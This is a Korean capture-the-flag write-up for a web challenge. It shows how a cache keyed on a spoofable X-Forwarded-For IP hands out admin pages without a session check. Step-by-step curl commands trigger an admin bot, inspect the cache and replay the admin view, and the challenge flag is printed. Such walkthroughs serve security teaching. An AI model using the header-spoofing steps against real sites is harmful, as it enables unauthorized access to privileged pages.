# KMU_Profile

## 문제 개요
이 문제는 **Cache Poisoning** 취약점을 이용해 관리자 권한으로 캐시된 페이지에 접근하여 플래그를 획득하는 웹 해킹 문제이다.

### 목표
- 일반 사용자 계정으로 로그인
- 관리자 프로필 페이지에서 플래그 획득
- 플래그: `KMU{cache_p0is0ning_is_dangerous_HaHa}`

## 애플리케이션 구조

### 주요 기능
1. **사용자 관리 시스템**
2. **신고 시스템**
3. **캐싱 시스템** (문제 풀이를 위해 페이지 접근 허용)
4. **관리자 패널**

## 취약점 분석

### 1. 캐시 메커니즘의 문제

- 캐시 히트 시 **세션 검증을 우회**함
- `req.session.user` 확인 없이 캐시된 응답을 그대로 반환
- IP 주소를 `X-Forwarded-For` 헤더로 조작 가능
- 관리자가 한 번 방문하면 해당 페이지가 캐시됨
- 이후 같은 IP로 접근 시 권한 검증 없이 캐시된 관리자 뷰 반환

### 2. 봇 시스템
1. 관리자 계정으로 로그인
2. 신고된 사용자의 프로필 페이지 방문
3. 관리자 패널도 방문 (여기 조회하는게 더 쉬운데, 결론적으로 /profile/admin이랑 /admin 둘다 가능)
4. **관리자 권한으로 본 페이지들이 캐시에 저장됨**

## 공격 시나리오

### 단계별 공격 과정

#### 1단계: 일반 사용자로 로그인
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"predic","password":"predic123"}' \
  -c cookies.txt
```

#### 2단계: 관리자 사용자 신고 (봇 트리거)
```bash
curl -X POST http://localhost:3000/report-user \
  -H "Content-Type: application/json" \
  -d '{"reportedUser":"admin","reason":"Suspicious activity"}' \
  -b cookies.txt
```

이때 봇이 다음과 같이 동작:
1. `admin` 계정으로 로그인
2. `/profile/admin` 페이지 방문 → **관리자 뷰가 캐시됨**
3. `/admin` 페이지도 방문 → **관리자 패널도 캐시됨**

#### 3단계: 봇 방문 대기 및 캐시 확인
```bash
sleep 10  # 봇이 방문할 시간 대기

curl -X GET http://localhost:3000/debug/cache
```

캐시 응답 예시:
```json
{
  "cache": [
    {
      "key": "/profile/admin|::ffff:127.0.0.1",
      "age": 3483,
      "size": 1580
    }
  ]
}
```

#### 4단계: 봇 IP로 위장하여 캐시된 페이지 접근
```bash
curl -X GET http://localhost:3000/profile/admin \
  -H "X-Forwarded-For: ::ffff:127.0.0.1"
```
또는
```bash
curl -X GET http://localhost:3000/admin \
  -H "X-Forwarded-For: ::ffff:127.0.0.1"
```

**결과:** 관리자 권한으로 캐시된 페이지가 반환되어 플래그 획득





